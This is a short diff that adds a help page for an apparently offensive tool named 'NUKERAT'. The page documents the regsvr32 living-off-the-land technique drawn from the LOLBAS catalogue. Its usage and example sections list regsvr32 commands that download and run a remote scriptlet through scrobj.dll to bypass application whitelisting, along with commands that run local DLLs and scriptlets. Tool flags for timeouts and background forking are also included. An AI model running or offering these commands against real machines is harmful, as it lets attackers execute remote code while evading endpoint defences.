@@ -1,0 +1,24 @@
+ABOUT
+    Windows utility to register dlls. LOLBAS covers execute code
+    from remote scriptlet, bypass Application whitelisting, execute
+    code from scriptlet, bypass Application whitelisting, and
+    related techniques.
+
+USAGE:
+    regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
+    regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll
+    regsvr32.exe /s {PATH:.dll}
+    regsvr32.exe /u /s {PATH:.dll}
+
+EXAMPLES:
+    regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
+    regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll
+    regsvr32.exe /s {PATH:.dll}
+    regsvr32.exe /u /s {PATH:.dll}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
